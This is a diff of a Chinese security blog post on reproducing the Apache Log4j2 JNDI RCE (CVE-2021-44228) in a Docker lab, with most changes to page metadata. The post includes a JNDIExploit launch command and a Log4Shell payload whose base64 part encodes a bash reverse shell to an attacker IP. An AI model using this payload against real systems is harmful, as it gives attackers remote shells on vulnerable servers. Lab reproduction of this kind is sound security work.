@@ -8,7 +8,7 @@
     <meta name="description" content="前言这洞真的是鲨疯了，安全圈直接过年，我也借此挖了几个edu，好好体会了下挖洞的感觉，算是正式入src的门了吧。
 分析TODO：以后再补
 先上个链接Apache Log4j2从RCE到RC1绕过
-本地测试详细见** apache-log4j">
+本地测试详细见 apache-log4j-r">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -574,14 +574,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-12-11
+                    2021-12-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    622
+                    625
                 </div>
                 
 
@@ -609,7 +609,7 @@
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这洞真的是鲨疯了，安全圈直接过年，我也借此挖了几个edu，好好体会了下挖洞的感觉，算是正式入src的门了吧。</p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>TODO：以后再补</p>
 <p>先上个链接<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649">Apache Log4j2从RCE到RC1绕过</a></p>
-<h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>详细见**<a target="_blank" rel="noopener" href="https://github.com/KagamigawaMeguri/apache-log4j-rce-poc"> apache-log4j-rce-poc</a>**</p>
+<h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>详细见<a target="_blank" rel="noopener" href="https://github.com/KagamigawaMeguri/apache-log4j-rce-poc"> apache-log4j-rce-poc</a></p>
 <h2 id="远程复现"><a href="#远程复现" class="headerlink" title="远程复现"></a>远程复现</h2><p><strong>环境</strong>1</p>
 <p>这个环境需要用rmi</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker run -d -P vulfocus&#x2F;log4j2-rce-2021-12-09:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -687,7 +687,7 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 # &#x3D;&gt; YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后启动<code>JNDIExploit</code></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDIExploit.jar -i ip -l 1389 -p 8180<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDIExploit.jar -i 192.168.110.131 -l 1389 -p 8180<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC9JUC9QT1JUIDA%252BJjE%253D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1082,18 +1082,17 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/p/2341403076.html">
+                <a href="/p/1006188223.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Apache Log4j2 RCE复现">
+                        <img src="/medias/featureimages/48.jpg" class="responsive-img" alt="关于SwitchyOmega+Burpsuite+Chrome无法抓取127.0.0.1/localhost问题及解决办法">
                         
-                        <span class="card-title">Apache Log4j2 RCE复现</span>
+                        <span class="card-title">关于SwitchyOmega+Burpsuite+Chrome无法抓取127.0.0.1/localhost问题及解决办法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1103,35 +1102,26 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-10
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-09
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SRC/" class="post-category">
-                                    SRC
+                            <a href="/categories/%E6%9D%82%E8%B0%88/" class="post-category">
+                                    杂谈
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-44228/">
-                        <span class="chip bg-color">CVE-2021-44228</span>
-                    </a>
-                    
-                    <a href="/tags/SRC/">
-                        <span class="chip bg-color">SRC</span>
+                    <a href="/tags/Burpsuite/">
+                        <span class="chip bg-color">Burpsuite</span>
                     </a>
                     
                 </div>
@@ -1326,7 +1316,7 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
         <div class="col s12 m8 l8 copy-right" style="text-align: center;">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2021</span>
+                <span id="year">2019-2022</span>
             
             <a href="/about" target="_blank">巡璃</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
